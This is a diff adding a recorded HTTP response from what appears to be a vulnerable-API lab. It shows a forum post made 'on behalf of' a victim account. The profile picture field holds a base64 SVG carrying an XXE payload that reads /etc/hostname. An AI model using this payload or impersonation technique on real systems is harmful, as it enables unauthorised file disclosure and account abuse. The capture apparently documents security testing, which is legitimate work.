@@ -1,0 +1,10 @@
+HTTP/2 200 OK
+Access-Control-Allow-Headers: Accept, Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization
+Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE
+Access-Control-Allow-Origin: *
+Content-Type: application/json
+Date: Fri, 29 May 2026 06:31:52 GMT
+Ngrok-Agent-Ips: X
+Server: openresty/1.27.1.2
+
+{"id":"v2wQqRQy4K9hjGWHFdt2qX","title":"I hacked victim and posting on behalf of victim@victim.com","content":"hi victim@victim.com","author":{"nickname":"Victim","email":"victim@victim.com","vehicleid":"f1cc8f72-8da1-44d5-a197-b23504fe6290","profile_pic_url":"data:image/jpeg;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJ5ZXMiPz48IURPQ1RZUEUgdGVzdCBbIDwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL2hvc3RuYW1lIiA+IF0+PHN2ZyB3aWR0aD0iMTI4cHgiIGhlaWdodD0iMTI4cHgiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHZlcnNpb249IjEuMSI+PHRleHQgZm9udC1zaXplPSIxNiIgeD0iMCIgeT0iMTYiPiZ4eGU7PC90ZXh0Pjwvc3ZnPg0K","created_at":"2026-05-29T06:31:52.690854203Z"},"comments":[],"authorid":8,"CreatedAt":"2026-05-29T06:31:52.690854534Z"}
